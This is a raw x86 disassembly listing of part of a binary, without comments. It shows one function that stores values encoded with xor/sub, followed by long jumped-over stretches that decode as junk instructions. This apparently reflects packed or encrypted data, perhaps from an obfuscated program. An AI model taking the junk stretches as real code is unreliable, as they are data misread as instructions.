  407375:	jbe    0x407325
  40737b:	mov    eax,DWORD PTR [ebp+0xc]
  40737e:	mov    ds:0x413a62,eax
  407383:	mov    eax,DWORD PTR [ebp+0x10]
  407386:	mov    ds:0x413cb6,eax
  40738b:	mov    eax,ds:0x413a62
  407390:	mov    ecx,DWORD PTR [ebp-0x14]
  407393:	push   DWORD PTR [ebp-0x18]
  407396:	sub    eax,edi
  407398:	push   DWORD PTR [ebp-0x1c]
  40739b:	xor    eax,esi
  40739d:	mov    DWORD PTR [ecx],eax
  40739f:	push   DWORD PTR [ebp-0x20]
  4073a2:	call   0x40e344
  4073a7:	sub    eax,edi
  4073a9:	xor    eax,esi
  4073ab:	mov    DWORD PTR [ebp+0xc],eax
  4073ae:	mov    ecx,DWORD PTR [ebp-0x4]
  4073b1:	mov    eax,DWORD PTR [ebp+0xc]
  4073b4:	xor    ecx,esi
  4073b6:	add    ecx,edi
  4073b8:	xor    edx,edx
  4073ba:	div    ecx
  4073bc:	mov    ecx,DWORD PTR [ebp-0x8]
  4073bf:	cmp    ecx,eax
  4073c1:	jne    0x4073cc
  4073c7:	call   0x401000
  4073cc:	lea    eax,[ebp+0x4]
  4073cf:	mov    DWORD PTR [ebp-0x24],eax
  4073d2:	mov    eax,ds:0x413bde
  4073d7:	push   0x4
  4073d9:	add    eax,0x1cc
  4073de:	push   eax
  4073df:	lea    eax,[ebp-0xc]
  4073e2:	push   eax
  4073e3:	call   0x410353
  4073e8:	mov    eax,DWORD PTR [ebp-0xc]
  4073eb:	mov    eax,DWORD PTR [ebp-0x4]
  4073ee:	mov    eax,DWORD PTR [ebp-0x8]
  4073f1:	mov    DWORD PTR [ebp+0xc],eax
  4073f4:	mov    eax,ds:0x413c62
  4073f9:	mov    ecx,DWORD PTR [ebp+0xc]
  4073fc:	sub    eax,edi
  4073fe:	xor    eax,esi
  407400:	cmp    eax,ecx
  407402:	je     0x407449
  407408:	mov    eax,ds:0x413c5a
  40740d:	mov    ecx,DWORD PTR [ebp+0xc]
  407410:	sub    eax,edi
  407412:	xor    eax,esi
  407414:	cmp    eax,ecx
  407416:	jne    0x40742c
  40741c:	mov    eax,ds:0x413c62
  407421:	add    eax,DWORD PTR ds:0x413c5a
  407427:	jmp    0x407433
  40742c:	mov    eax,DWORD PTR [ebp+0xc]
  40742f:	xor    eax,esi
  407431:	add    eax,edi
  407433:	mov    ds:0x413c5a,eax
  407438:	mov    eax,DWORD PTR [ebp+0xc]
  40743b:	xor    eax,esi
  40743d:	add    eax,edi
  40743f:	mov    ds:0x413c62,eax
  407444:	jmp    0x407453
  407449:	mov    eax,ds:0x413c62
  40744e:	mov    ds:0x413c5a,eax
  407453:	mov    eax,DWORD PTR [ebp-0x24]
  407456:	mov    ecx,DWORD PTR ds:0x413c5a
  40745c:	add    DWORD PTR [eax],ecx
  40745e:	mov    eax,DWORD PTR [ebp-0xc]
  407461:	mov    eax,DWORD PTR [eax]
  407463:	pop    edi
  407464:	pop    esi
  407465:	pop    ebx
  407466:	leave  
  407467:	ret    0xc
  40746a:	push   ebp
  40746b:	mov    ebp,esp
  40746d:	push   ecx
  40746e:	push   ecx
  40746f:	mov    DWORD PTR ds:0x43376f,edi
  407475:	mov    eax,0x5a3fc98
  40747a:	movzx  ecx,WORD PTR ds:0x43372f
  407481:	mov    DWORD PTR [ebp-0x4],eax
  407484:	jmp    0x4077cf
  407489:	shl    DWORD PTR [edi],0x5f
  40748c:	sbb    DWORD PTR [ecx+0x61],ebx
  40748f:	inc    ecx
  407490:	out    0xc2,eax
  407492:	jle    0x40743d
  407494:	inc    ebx
  407495:	push   cs
  407496:	ret    0x135e
  407499:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40749a:	sar    BYTE PTR [esi+0x7e],0x20
  40749e:	jge    0x40751e
  4074a0:	jle    0x4074c5
  4074a2:	rol    DWORD PTR [ebx+0x7a],0x43
  4074a6:	dec    esp
  4074a7:	mov    ds:0x3266c24b,eax
  4074ac:	push   edi
  4074ad:	pushf  
  4074ae:	mov    eax,0xc00fa8e5
  4074b3:	xlat   BYTE PTR ds:[ebx]
  4074b4:	sub    DWORD PTR [eax-0x23],edx
  4074b7:	xchg   ebx,eax
  4074b8:	sbb    edi,DWORD PTR [edx+edi*4+0x1e]
  4074bc:	xor    BYTE PTR [edi+eax*8-0x1c],ch
  4074c0:	out    0xe9,al
  4074c2:	cmp    eax,0x7a0aefc1
  4074c7:	out    dx,eax
  4074c8:	mov    ebx,0x4e58aac2
  4074cd:	inc    esp
  4074ce:	and    ah,ah
  4074d0:	ja     0x40754f
  4074d2:	adc    ecx,DWORD PTR [edx+0x33]
  4074d5:	sbb    DWORD PTR [eax],0x1a
  4074d8:	add    ebp,DWORD PTR [ecx+eax*1+0x6a]
  4074dc:	or     al,0x4c
  4074de:	mov    al,0x49
  4074e0:	sub    dl,dh
  4074e2:	and    DWORD PTR [esi],esp
  4074e4:	adc    BYTE PTR [eax+0x2d6ccd4f],bl
  4074ea:	mov    esi,0xe9db503d
  4074ef:	iret   
  4074f0:	mov    al,0xb
  4074f2:	pop    ss
  4074f3:	test   BYTE PTR [edx+eax*4-0x7b79d236],dl
  4074fa:	sub    al,0xa4
  4074fc:	lea    eax,[edx]
  4074fe:	int3   
  4074ff:	mov    dl,0x15
  407501:	and    BYTE PTR [ebx-0x33],ah
  407504:	sub    eax,0x25331c39
  407509:	jl     0x4074d8
  40750b:	bound  ecx,QWORD PTR [esp+eiz*4]
  40750e:	sbb    eax,0xeaca658c
  407513:	aaa    
  407514:	sub    eax,ebx
  407516:	(bad)  
  407517:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407518:	jl     0x407573
  40751a:	sahf   
  40751b:	mov    al,0xb1
  40751d:	nop
  40751e:	and    DWORD PTR [edx+ebp*4-0x1bd7fb07],0x9b181a5a
  407529:	jo     0x407507
  40752b:	aaa    
  40752c:	sar    DWORD PTR [eax+0x3cc169b3],0xca
  407533:	inc    esp
  407534:	sbb    BYTE PTR [ecx],ah
  407536:	js     0x4074ef
  407538:	jne    0x407587
  40753a:	in     al,dx
  40753b:	jmp    0x91c64863
  407540:	pop    eax
  407541:	add    esp,DWORD PTR [esi+0x23595c45]
  407547:	call   0xb577da6c
  40754c:	adc    eax,0x826ed692
  407551:	sbb    bh,BYTE PTR [ebx]
  407553:	scas   al,BYTE PTR es:[edi]
  407554:	or     eax,0xddf1a7fd
  407559:	mov    ecx,0x3540efd9
  40755e:	retf   
  40755f:	outs   dx,DWORD PTR ds:[esi]
  407560:	mov    edx,0x9af09f77
  407565:	arpl   sp,dx
  407567:	xchg   DWORD PTR ss:[edx+0x46d784a],eax
  40756e:	push   edx
  40756f:	and    ebx,ecx
  407571:	sbb    ah,0x14
  407574:	sar    BYTE PTR [ebp+0x7f34cf0b],1
  40757a:	xor    ebx,DWORD PTR [ebp+0x72]
  40757d:	xchg   edi,eax
  40757e:	bnd jl 0x40758a
  407581:	mov    al,ds:0x4c8b3ba1
  407586:	loopne 0x407603
  407588:	fdivrp st(2),st
  40758a:	mov    ch,0xbf
  40758c:	loopne 0x407593
  40758e:	fcomip st,st(2)
  407590:	mov    dh,0x27
  407592:	xchg   esp,eax
  407593:	dec    ebx
  407594:	xchg   esp,eax
  407595:	mov    eax,ds:0x637331c4
  40759a:	aas    
  40759b:	scas   al,BYTE PTR es:[edi]
  40759c:	sub    eax,0x97b216b2
  4075a1:	ss test al,0x9b
  4075a4:	rol    BYTE PTR [esi],0x98
  4075a7:	xchg   esi,eax
  4075a8:	adc    ebp,edx
  4075aa:	call   0xbbc9:0x4009bb6e
  4075b1:	nop
  4075b2:	sbb    eax,0x9ca81ff6
  4075b7:	out    0xc8,al
  4075b9:	mov    ds:0x4693d19f,al
  4075be:	in     al,dx
  4075bf:	jmp    0xa04b7419
  4075c4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4075c5:	addr16 loopne 0x4075dc
  4075c8:	jl     0x4075a2
  4075ca:	pop    ecx
  4075cb:	dec    eax
  4075cc:	cmc    
  4075cd:	pop    ds
  4075ce:	adc    ebp,DWORD PTR [ecx+edi*1+0x0]
  4075d2:	in     eax,0xf0
  4075d4:	cmp    ah,dh
  4075d6:	aam    0x81
  4075d8:	xchg   esp,eax
  4075d9:	std    
  4075da:	ret    
  4075db:	cmp    DWORD PTR [ebx],edi
  4075dd:	jns    0x407610
  4075df:	pop    eax
  4075e0:	push   ss
  4075e1:	lods   al,BYTE PTR ds:[esi]
  4075e2:	les    edx,FWORD PTR [ebx+0x3cd79183]
  4075e8:	retf   
  4075e9:	or     eax,0x527d3c44
  4075ee:	jl     0x407652
  4075f0:	xchg   ecx,eax
  4075f1:	mov    DWORD PTR [edi-0x7d],edi
  4075f4:	scas   al,BYTE PTR es:[edi]
  4075f5:	sbb    DWORD PTR [eax+0x1b049e3d],ecx
  4075fb:	mov    al,0x12
  4075fd:	mov    dh,0x43
  4075ff:	dec    edx
  407600:	pop    edi
  407601:	out    0x33,eax
  407603:	(bad)  
  407604:	sub    esp,DWORD PTR [ebx]
  407606:	adc    eax,0xd3057201
  40760b:	es jecxz 0x4075fb
  40760e:	cld    
  40760f:	aaa    
  407610:	std    
  407611:	repz hlt 
  407613:	div    ch
  407615:	sbb    dl,dl
  407617:	mov    ds:0x80a09679,al
  40761c:	xchg   esp,eax
  40761d:	sub    ebx,DWORD PTR [eax+eax*1]
  407620:	inc    edx
  407621:	dec    ebp
  407622:	jecxz  0x40769d
  407624:	mov    ebx,0x16a0e578
  407629:	jb     0x407690
  40762b:	cmp    esi,0x48fb0d4d
  407631:	sti    
  407632:	out    0xb5,eax
  407634:	dec    ebx
  407635:	popf   
  407636:	into   
  407637:	add    ah,BYTE PTR [edi]
  407639:	add    al,0x45
  40763b:	add    eax,0xa3f33850
  407640:	loopne 0x4075e7
  407642:	dec    eax
  407643:	jne    0x407663
  407645:	sub    bl,BYTE PTR [esi]
  407647:	xlat   BYTE PTR ds:[ebx]
  407648:	fadd   QWORD PTR [edi-0x34]
  40764b:	in     eax,dx
  40764c:	repz popa 
  40764e:	xchg   esp,eax
  40764f:	and    DWORD PTR [edx-0x69e6b4b1],ebp
  407655:	sub    DWORD PTR [eax+0x36],0xffffffd0
  407659:	adc    edx,0xffffffca
  40765c:	push   esi
  40765d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40765e:	clc    
  40765f:	cdq    
  407660:	leave  
  407661:	test   eax,0x2b3a61af
  407666:	out    0xd7,al
  407668:	adc    eax,0xa46d7b94
  40766d:	fdiv   DWORD PTR ds:[ebp+0x4bfcd056]
  407674:	xor    DWORD PTR [ecx+ebx*8],eax
  407677:	cmp    al,0x4
  407679:	push   ds
  40767a:	aad    0xaf
  40767c:	test   DWORD PTR [ecx+eax*8+0x35333672],eax
  407683:	mov    ebx,0xf6d7fcf0
  407688:	jl     0x407666
  40768a:	xor    ebp,DWORD PTR [ebx+esi*4-0x73ad9952]
  407691:	push   es
  407692:	inc    edi
  407693:	and    edx,edx
  407695:	dec    esp
  407696:	mov    ds:0xe64da0a1,eax
  40769b:	ds das 
  40769d:	cmp    bl,BYTE PTR [ecx+0x2bdc6da9]
  4076a3:	sti    
  4076a4:	mov    ds:0xeec461c2,eax
  4076a9:	bound  edx,QWORD PTR [ecx+0x5c89fdbd]
  4076af:	pusha  
  4076b0:	les    esi,FWORD PTR [esi-0x7d]
  4076b3:	fnstsw WORD PTR [ebx-0x31ecec75]
  4076b9:	sbb    esp,esi
  4076bb:	ret    
  4076bc:	jno    0x4076c1
  4076be:	cwde   
  4076bf:	inc    edx
  4076c0:	jnp    0x407672
  4076c2:	and    dh,0x42
  4076c5:	ins    DWORD PTR es:[edi],dx
  4076c6:	stos   DWORD PTR es:[edi],eax
  4076c7:	into   
  4076c8:	xchg   esp,eax
  4076c9:	call   0x7b712e53
  4076ce:	adc    DWORD PTR [esi-0x84c8a6a],esi
  4076d4:	mov    bh,0x2e
  4076d6:	cld    
  4076d7:	push   cs
  4076d8:	ja     0x407748
  4076da:	mov    DWORD PTR [ebx-0x74],edi
  4076dd:	and    al,0xd
  4076df:	ja     0x40771f
  4076e1:	inc    edx
  4076e2:	xchg   ebp,eax
  4076e3:	pushf  
  4076e4:	inc    ebx
  4076e5:	(bad)  
  4076e6:	popa   
  4076e7:	jns    0x40775d
  4076e9:	lds    esi,FWORD PTR [ebp+0x35]
  4076ec:	mov    ds,WORD PTR [ebx+eiz*1+0x13]
  4076f0:	push   DWORD PTR [edx+0x48e1edcb]
  4076f6:	pop    ebx
  4076f7:	scas   al,BYTE PTR es:[edi]
  4076f8:	push   es
  4076f9:	dec    ebx
  4076fa:	hlt    
  4076fb:	rol    BYTE PTR [eax+ebx*1+0x346fd36b],cl
  407702:	xchg   ebp,eax
  407703:	cmp    cl,BYTE PTR ds:0xf1a5ea3
  40770a:	mov    ebx,0xd1387436
  40770f:	mov    eax,eax
  407711:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407712:	pop    es
  407713:	(bad)  
  407714:	jno    0x40770c
  407716:	and    BYTE PTR [eax+ebx*1+0x7f61c5c3],dh
  40771d:	ins    BYTE PTR es:[edi],dx
  40771e:	push   es
  40771f:	test   eax,0x3bdf6488
  407724:	push   eax
  407725:	addr16 xchg esi,eax
  407727:	mov    edi,DWORD PTR [esi]
  407729:	add    eax,0x5039fb7c
  40772e:	das    
  40772f:	push   esp
  407730:	rcl    DWORD PTR [ebx],1
  407732:	xor    al,0xce
  407734:	or     dh,BYTE PTR [eax+0x6]
  407737:	pop    ds
  407738:	add    ebp,DWORD PTR [ebp-0x20]
  40773b:	(bad)  
  40773c:	int    0xc7
  40773e:	data16 cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407740:	fcmovu st,st(4)
  407742:	adc    eax,0x327ae683
  407747:	rcl    dl,0x48
  40774a:	outs   dx,DWORD PTR ds:[esi]
  40774b:	std    
  40774c:	or     bh,BYTE PTR [eax-0x3e222b28]
  407752:	push   0x76a1a779
  407757:	sub    DWORD PTR [eax],ecx
  407759:	das    
  40775a:	xor    ebx,DWORD PTR [ebx-0x5eeec02c]
  407760:	rcl    BYTE PTR [esi-0x7d42a900],1
  407766:	push   edi
  407767:	icebp  
  407768:	mov    esi,0xfc3ed21
  40776d:	leave  
  40776e:	adc    dh,BYTE PTR [eax-0x1d]
  407771:	pop    esp
  407772:	enter  0x4afb,0xcf
  407776:	ins    DWORD PTR es:[edi],dx
  407777:	test   DWORD PTR [esi+ebp*1-0x13],0xf1d4e1ef
  40777f:	mov    ch,BYTE PTR [eax+0x618efdeb]
  407785:	das    
  407786:	push   ebx
  407787:	and    ch,BYTE PTR [ebx-0x3f]
  40778a:	or     ebx,DWORD PTR [ebx+0x55]
  40778d:	shl    ebx,1
  40778f:	jg     0x40780e
  407791:	xchg   edi,eax
  407792:	into   
  407793:	mov    ecx,0x1db9dd8c
  407798:	push   edi
  407799:	adc    ch,BYTE PTR [edx]
  40779b:	lock or al,0x5e
  40779e:	pushf  
  40779f:	sbb    DWORD PTR [ebx-0xd2e6c4d],0xffffffc5
  4077a6:	push   eax
  4077a7:	xchg   edi,eax
  4077a8:	inc    esp
  4077a9:	sub    eax,0x4d2ec0aa
  4077ae:	and    eax,0xb433bbaa
  4077b3:	dec    eax
  4077b4:	pop    ebx
  4077b5:	stc    
  4077b6:	aas    
  4077b7:	in     eax,dx
  4077b8:	jl     0x4077e3
  4077ba:	ud2    
  4077bc:	add    eax,0xa1fe27ce
  4077c1:	push   ebx
  4077c2:	lahf   
  4077c3:	dec    edi
  4077c4:	xor    al,0xc0
  4077c6:	sbb    edi,DWORD PTR [ecx+edi*8+0x478bbfda]
  4077cd:	jo     0x407829
  4077cf:	mov    ecx,DWORD PTR [ebp-0x4]
  4077d2:	mov    DWORD PTR ds:0x4337a7,0x5e65
  4077dc:	mov    DWORD PTR [ebp-0x8],0x4ec1
  4077e3:	jmp    0x407b2e
  4077e8:	out    dx,eax
  4077e9:	psubd  mm2,QWORD PTR [ecx+0x5a]
  4077ed:	push   ecx
  4077ee:	cmc    
  4077ef:	mov    cl,0x14
  4077f1:	loop   0x40786d
  4077f3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4077f4:	sub    BYTE PTR [ebx-0x30a9b3e5],dl
  4077fa:	jle    0x40787a
  4077fc:	and    BYTE PTR [ebp+0x7e],bh
  4077ff:	jle    0x407799
  407801:	clc    
  407802:	pop    ebp
  407803:	or     ah,BYTE PTR [edi-0x41]
  407806:	add    al,0x28
  407808:	stc    
  407809:	xchg   esi,esi
  40780b:	into   
  40780c:	lods   al,BYTE PTR ds:[esi]
  40780d:	out    dx,al
  40780e:	outs   dx,BYTE PTR ds:[esi]
  40780f:	adc    BYTE PTR [esp+ebx*8+0x2fce505b],bh
  407816:	lea    eax,[ebx]
  407818:	jge    0x40785b
  40781a:	cli    
  40781b:	xor    al,0x39
  40781d:	cmp    bh,BYTE PTR ds:[edx-0x20c12aa5]
  407824:	adc    edx,edi
  407826:	imul   DWORD PTR [ecx+0x7aff0314]
  40782c:	push   eax
  40782d:	pop    ds
  40782e:	aam    0x63
  407830:	sbb    BYTE PTR [ebp-0x3588094c],0x38
  407837:	mov    cx,0x46fd
  40783b:	xchg   DWORD PTR [eax+0x2],edx
  40783e:	int    0x40
  407840:	add    DWORD PTR [edi-0x5e421a41],edx
  407846:	and    eax,0x563abd22
  40784b:	outs   dx,DWORD PTR ds:[esi]
  40784c:	enter  0xc726,0xa0
  407850:	jne    0x407867
  407852:	mov    ecx,0x844030dc
  407857:	out    0xa9,al
  407859:	push   edx
  40785a:	nop
  40785b:	hlt    
  40785c:	xor    edx,DWORD PTR [ebp-0x402c3816]
  407862:	jne    0x407811
  407864:	pop    ss
  407865:	int    0xcc
  407867:	pop    edx
  407868:	leave  
  407869:	js     0x407885
  40786b:	xor    DWORD PTR [ebp+0x7e],ecx
  40786e:	std    
  40786f:	mov    ds:0xff189dc4,al
  407874:	je     0x4077fc
  407876:	dec    ebx
  407878:	das    
  407879:	xor    eax,0x27b7fde5
  40787e:	ficomp DWORD PTR [esi]
  407880:	jno    0x4078ab
  407882:	scas   al,BYTE PTR es:[edi]
  407883:	loope  0x407888
  407885:	dec    esi
  407886:	repz dec edi
  407888:	lahf   
  407889:	fimul  DWORD PTR [edi+0x1c]
  40788c:	mov    edx,0x35646980
  407891:	das    
  407892:	std    
  407893:	cmp    ah,cl
  407895:	cwde   
  407896:	out    0x59,al
  407898:	push   0x2d841ba6
  40789d:	or     DWORD PTR [ecx-0x1d],0x2fa9180d
  4078a4:	sbb    ebp,DWORD PTR [edx]
  4078a6:	mov    ebp,0xd0b88543
  4078ab:	mov    DWORD PTR [esi],eax
  4078ad:	test   esp,esi
  4078af:	cmp    BYTE PTR [ecx-0x24],ch
  4078b2:	popf   
  4078b3:	mov    bh,0xa1
  4078b5:	xor    ch,0x75
  4078b8:	and    ebp,esi
  4078ba:	stos   DWORD PTR es:[edi],eax
  4078bb:	cmp    ch,BYTE PTR ss:[ebx]
  4078be:	test   BYTE PTR [eax-0x52],ah
  4078c1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4078c2:	mov    esp,0xea59ea2
  4078c7:	outs   dx,DWORD PTR ds:[esi]
  4078c8:	mov    esi,0xf7099026
  4078cd:	cmp    eax,ebx
  4078cf:	add    BYTE PTR [ecx+esi*4-0x32d9b668],0xf5
  4078d7:	mov    esi,0x995c32fe
  4078dc:	cmp    al,0xb2
  4078de:	lock or BYTE PTR [ebx],0xbc
  4078e2:	repz xchg esp,eax
  4078e4:	push   es
  4078e5:	sbb    ecx,DWORD PTR [ecx+edi*8+0x3d]
  4078e9:	inc    ebp
  4078ea:	fnstenv [ecx-0x58c3a5a]
  4078f0:	jbe    0x4078ec
  4078f2:	lods   eax,DWORD PTR ds:[esi]
  4078f3:	in     al,0xcc
  4078f5:	push   edx
  4078f6:	pop    ebx
  4078f7:	inc    ecx
  4078f8:	mov    edx,0xd67e5d49
  4078fd:	inc    ebp
  4078fe:	push   ebx
  4078ff:	sti    
  407900:	jmp    0x407936
  407902:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407903:	outs   dx,BYTE PTR ds:[esi]
  407904:	or     DWORD PTR [edi],0xffffffa4
  407907:	jg     0x407899
  407909:	bnd jne 0x4078b4
  40790c:	call   0x1e3e:0xa0946546
  407913:	or     edx,DWORD PTR [esi]
  407915:	jmp    0xcec76c2e
  40791a:	repnz mov ch,0xcb
  40791d:	das    
  40791e:	popa   
  40791f:	outs   dx,DWORD PTR ds:[esi]
  407920:	lock test WORD PTR [edi-0x3b1b7394],si
  407928:	xchg   edx,eax
  407929:	xor    ch,cl
  40792b:	scas   al,BYTE PTR es:[edi]
  40792c:	push   ebp
  40792d:	and    al,0xa0
  40792f:	mov    eax,ds:0x74e0b9a1
  407934:	push   esp
  407935:	jbe    0x407979
  407937:	mov    BYTE PTR [ebp+0x52],bl
  40793a:	sub    eax,0x99010c19
  40793f:	dec    ebx
  407940:	iret   
  407941:	mov    ch,0x67
  407943:	inc    eax
  407944:	sbb    eax,0x84553895
  407949:	inc    ebx
  40794a:	jnp    0x40792d
  40794c:	mov    ah,0x15
  40794e:	or     al,0xd8
  407950:	fs pop ecx
  407952:	ds jge 0x407963
  407955:	pop    ebp
  407956:	mov    edx,0x9b1bab57
  40795b:	xchg   edi,eax
  40795c:	jl     0x4078de
  40795e:	cmp    BYTE PTR [eax-0x6],0xef
  407962:	dec    edi
  407963:	neg    DWORD PTR [edx]
  407965:	jno    0x407911
  407967:	xor    DWORD PTR [eax-0x2],esi
  40796a:	mov    cl,0xe0
  40796c:	xor    DWORD PTR [edx],esp
  40796e:	jle    0x4079ca
  407970:	push   ebp
  407971:	(bad)  
  407972:	lods   al,BYTE PTR ds:[esi]
  407973:	dec    eax
  407974:	mov    ebp,DWORD PTR [ebp-0x40]
  407977:	dec    eax
  407978:	hlt    
  407979:	dec    ebx
  40797a:	sysret 
  40797c:	pop    edi
  40797d:	push   0x5e720a2f
  407982:	gs xchg edi,eax
  407984:	sub    DWORD PTR [ebp+0x21],ebp
  407987:	inc    ecx
  407988:	fistp  WORD PTR [esi+ebp*4-0x437153f3]
  40798f:	pop    ebx
  407990:	jne    0x407979
  407992:	mov    ebx,0x18210513
  407997:	in     eax,0xd7
  407999:	loopne 0x407963
  40799b:	rep lods eax,DWORD PTR ds:[esi]
  40799d:	cmp    BYTE PTR [eax],0x2a
  4079a0:	push   es
  4079a1:	loope  0x407957
  4079a3:	fdiv   QWORD PTR [esi+0xd]
  4079a6:	das    
  4079a7:	push   0xffffffdb
  4079a9:	sub    edx,DWORD PTR [ebx]
  4079ab:	int    0xf5
  4079ad:	and    ebp,DWORD PTR [ebp+0x61ae683b]
  4079b3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4079b4:	xchg   ebp,eax
  4079b5:	sub    ebp,esi
  4079b7:	add    ax,0xc43f
  4079bb:	mov    dh,ah
  4079bd:	ror    BYTE PTR [edx-0x50],cl
  4079c0:	mov    ebp,0x66bd8738
  4079c5:	pop    eax
  4079c6:	loop   0x4079a5
  4079c8:	mov    bl,0xa1
  4079ca:	shl    BYTE PTR [ebp-0x6f],0x1b
  4079ce:	sub    esi,DWORD PTR [eax-0x40]
  4079d1:	and    DWORD PTR [ecx-0x29d1b471],0xaeb9ae6
  4079db:	pop    ebx
  4079dc:	jne    0x407a54
  4079de:	xchg   ecx,eax
  4079df:	(bad)  
  4079e0:	ret    
  4079e1:	and    BYTE PTR [edx+0x34fb1a04],bl
  4079e7:	push   0x680be7a2
  4079ec:	and    ch,BYTE PTR [esi]
  4079ee:	adc    ebp,ebp
  4079f0:	mov    ecx,DWORD PTR [ebx+ecx*2]
  4079f3:	xor    bl,bh
  4079f5:	push   edi
  4079f6:	ror    BYTE PTR [edi+0x49bc906],0x27
  4079fd:	scas   al,BYTE PTR es:[edi]
  4079fe:	mov    esi,0x2673d024
  407a03:	mov    cl,0x51
  407a05:	bound  eax,QWORD PTR [ecx-0x3ce8b94e]
  407a0b:	aaa    
  407a0c:	das    
  407a0d:	call   0xe65768de
  407a12:	ds push ebx
  407a14:	mov    ecx,DWORD PTR [edi+0x7cc568ac]
  407a1a:	repnz outs dx,DWORD PTR ds:[esi]
  407a1c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407a1d:	fmul   DWORD PTR [esi+0x18]
  407a20:	or     eax,edi
  407a22:	cmp    DWORD PTR [ebx],ebx
  407a24:	inc    esp
  407a25:	sti    
  407a26:	dec    ebx
  407a27:	xchg   edi,eax
  407a28:	ja     0x4079bb
  407a2a:	lods   eax,DWORD PTR ds:[esi]
  407a2b:	sbb    edi,DWORD PTR [edi+0x41]
  407a2e:	ins    BYTE PTR es:[edi],dx
  407a2f:	push   0x23
  407a31:	bound  ebx,QWORD PTR [edi+eax*4+0x16]
  407a35:	xchg   ecx,eax
  407a36:	rcr    eax,cl
  407a38:	out    dx,al
  407a39:	mov    dh,0xdb
  407a3b:	add    DWORD PTR [esi+0x273a4186],esp
  407a41:	cwde   
  407a42:	das    
  407a43:	ror    BYTE PTR [edi+edx*4-0x5b],cl
  407a47:	aas    
  407a48:	fstp   TBYTE PTR [ecx]
  407a4a:	imul   ecx,DWORD PTR [eax],0x3ac1abd8
  407a50:	pop    ebx
  407a51:	mov    cs,ecx
  407a53:	jg     0x407aa1
  407a55:	adc    DWORD PTR [ebp-0x7b],esp
  407a58:	cmp    BYTE PTR [ecx+0x68],dl
  407a5b:	inc    edx
  407a5c:	push   ecx
  407a5d:	pop    edi
  407a5e:	push   es
  407a5f:	xchg   edi,edx
  407a61:	push   ss
  407a62:	sbb    eax,0x852726de
  407a67:	cmp    ah,al
  407a69:	pop    edi
  407a6a:	lods   al,BYTE PTR ds:[esi]
  407a6b:	les    esi,FWORD PTR [ebx]
  407a6d:	adc    BYTE PTR [ebx],bl
  407a6f:	xor    ebx,ecx
  407a71:	sti    
  407a72:	fadd   QWORD PTR ds:0x93701ef6
  407a78:	movs   DWORD PTR es:[di],DWORD PTR es:[si]
  407a7b:	inc    esi
  407a7c:	lahf   
  407a7d:	mov    ebx,0x4550ed85
  407a82:	sti    
  407a83:	enter  0xe32c,0xf1
  407a87:	mov    eax,ds:0x58e11150
  407a8c:	cwde   
  407a8d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407a8e:	jno    0x407a76
  407a90:	fnstcw WORD PTR [edi+eax*1-0x79]
  407a94:	lahf   
  407a95:	mov    eax,0xef62bb1e
  407a9a:	mov    es,WORD PTR [edx-0x346268c5]
  407aa0:	jnp    0x407a9c
  407aa2:	mov    ch,0x45
  407aa4:	add    dh,ch
  407aa6:	cmp    al,dl
  407aa8:	cmp    ebp,eax
  407aaa:	xrelease xchg DWORD PTR [esi-0x269138a1],ecx
  407ab1:	adc    DWORD PTR [ebx-0x2],esp
  407ab4:	pusha  
  407ab5:	xor    bh,BYTE PTR [eax+0x5d347bbf]
  407abb:	mov    dl,0x5f
  407abd:	fidivr DWORD PTR [ecx+0x0]
  407ac0:	push   0xffffff9b
  407ac2:	mov    gs,WORD PTR ds:0x6ebee79
  407ac8:	loope  0x407b37
  407aca:	neg    DWORD PTR [edi-0x1990b8ab]
  407ad0:	add    eax,0x80d8c7c0
  407ad5:	(bad)  
  407ad6:	cmp    al,0x22
  407ad8:	add    eax,0xf0050e33
  407add:	out    0x9d,al
  407adf:	dec    esi
  407ae0:	inc    edi
  407ae1:	xchg   edi,eax
  407ae2:	retf   
  407ae3:	out    0x55,al
  407ae5:	mov    ah,0x21
  407ae7:	icebp  
  407ae8:	pop    eax
  407ae9:	ret    
  407aea:	ret    
  407aeb:	(bad)  
  407aec:	outs   dx,DWORD PTR ds:[esi]
  407aed:	ret    0x1644
  407af0:	push   eax
  407af1:	push   edx
  407af2:	in     eax,dx
  407af3:	pop    esi
  407af4:	loop   0x407b5d
  407af6:	shl    BYTE PTR [ecx],cl
  407af8:	int    0xb8
  407afa:	hlt    
  407afb:	repz xor esp,ecx
  407afe:	and    dh,BYTE PTR [ebx+0x33]
  407b01:	pop    ss
  407b02:	xchg   ebp,eax
  407b03:	sbb    bl,bl
  407b05:	in     al,dx
  407b06:	aam    0x89
  407b08:	add    DWORD PTR [ebx+eax*4-0x73bdd32e],esp
  407b0f:	jno    0x407b6b
  407b11:	out    dx,al
  407b12:	cmc    
  407b13:	retf   
  407b14:	mov    BYTE PTR [edi+ecx*2],0x7
  407b18:	sti    
  407b19:	push   ds
  407b1a:	inc    ecx
  407b1b:	pushf  
  407b1c:	xchg   esi,eax
  407b1d:	mov    ch,0x19
  407b1f:	ds js  0x407aed
  407b22:	or     edi,DWORD PTR [edx]
  407b24:	pop    edx
  407b25:	mov    dh,BYTE PTR [esi]
  407b27:	pushf  
  407b28:	dec    esp
  407b29:	clc    
  407b2a:	jo     0x407b2d
  407b2c:	xchg   esi,eax
  407b2d:	out    0x3b,al
  407b2f:	enter  0x850f,0xc6
  407b33:	add    eax,DWORD PTR [eax]
  407b35:	add    BYTE PTR [esi-0x75],ah
  407b38:	inc    ebp
  407b39:	clc    
  407b3a:	xor    ecx,0x551
  407b40:	mov    ecx,0x8a3c
  407b45:	sub    DWORD PTR ds:0x433723,0x433767
  407b4f:	xor    ax,cx
  407b52:	mov    ecx,0x3b02
  407b57:	sub    DWORD PTR ds:0x433803,0x1193
  407b61:	add    ax,cx
  407b64:	mov    ecx,DWORD PTR [ebp+0x8]
  407b67:	movzx  eax,ax
  407b6a:	and    DWORD PTR ds:0x43372b,0x433827
  407b74:	not    eax
  407b76:	and    eax,DWORD PTR [ecx]
